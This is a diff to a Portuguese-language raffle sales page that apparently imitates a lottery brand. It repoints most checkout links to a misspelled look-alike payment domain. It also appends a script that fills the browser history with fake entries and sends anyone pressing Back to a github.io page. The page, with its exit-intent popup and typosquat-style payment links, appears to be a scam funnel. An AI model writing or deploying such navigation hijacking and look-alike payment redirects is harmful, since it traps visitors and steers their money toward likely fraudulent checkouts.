@@ -16777,15 +16777,15 @@
                 const precoPorUnidade = 0.99;
                 const cotasDisponiveis = [20, 30, 40, 70, 100, 200, 400, 500, 1000];
                 const linksCheckout = {
-                    20: "https://pay.novopagamentoseguroo.com/checkout/40777047-a51f-47c7-a87a-f95fc9cd05b0",
-                    30: "https://pay.novopagamentoseguroo.com/checkout/792ddfd3-715e-4d7c-b827-3e72878df8d2",
-                    40: "https://pay.novopagamentoseguroo.com/checkout/0fa8d728-a08a-4f5e-9351-daff92c82d4b",
-                    70: "https://pay.novopagamentoseguroo.com/checkout/da131c2e-072c-4339-b635-01d9357e338f",
-                    100: "https://pay.novopagamentoseguroo.com/checkout/3520cee4-193a-46c6-82a9-2bcdb6bbcab0",
+                    20: "https://pay.novopaggamentoseguro.com/checkout/54b920c5-e656-47b0-b260-726453b1f9e1",
+                    30: "https://pay.novopaggamentoseguro.com/checkout/b5e77539-92ee-49f8-9f0a-af11ed7b8742",
+                    40: "https://pay.novopaggamentoseguro.com/checkout/a910e4ef-cef3-470f-8538-63b62304eb6e",
+                    70: "https://pay.novopaggamentoseguro.com/checkout/97522949-b889-4bd0-8c06-6c6fb6377641",
+                    100: "https://pay.novopaggamentoseguro.com/checkout/a2420463-2cbe-4b3d-8577-766042861f24",
                     200: "https://pay.novopagamentoseguroo.com/checkout/9de340b0-a791-4fd4-abce-0b312b039d0f",
-                    400: "https://pay.novopagamentoseguroo.com/checkout/16c76c22-d0bd-4c76-a19d-357e407142a6",
-                    500: "https://pay.novopagamentoseguroo.com/checkout/f2ba6483-208d-4668-932f-e6883e226058",
-                    1000: "https://pay.novopagamentoseguroo.com/checkout/6822396e-30ae-4cca-a82d-470a40f0286c"
+                    400: "https://pay.novopaggamentoseguro.com/checkout/360633fa-1527-4268-8a98-4f470ec7c217",
+                    500: "https://pay.novopaggamentoseguro.com/checkout/0bbd7972-0d11-43bd-b4ec-d716797c12a3",
+                    1000: "https://pay.novopaggamentoseguro.com/checkout/43a8832d-d483-4353-a210-1cbb7ccafb77"
                 };
 
                 // Função principal para seleção de cotas
@@ -17255,7 +17255,7 @@
                     acceptBtn.addEventListener('click', function () {
                         hidePopup();
                         // Redirecionar para a página de checkout de 15 títulos + 15 gratís por R$14,99
-                        window.location.href = "https://pay.novopagamentoseguroo.com/checkout/3d510eba-e444-4bd3-ae50-9809dcb7beb7" + window.location.search;
+                        window.location.href = "https://pay.novopaggamentoseguro.com/checkout/4dbe2974-bf2d-4c6e-bd79-e90b36c4229b" + window.location.search;
                     });
 
                     // 1. Detecta quando o mouse sai da janela (para desktop)
@@ -17734,3 +17734,28 @@
           </div>
         </div>
       </body></html>
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'https://vivasorteeoficial.github.io/desc/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
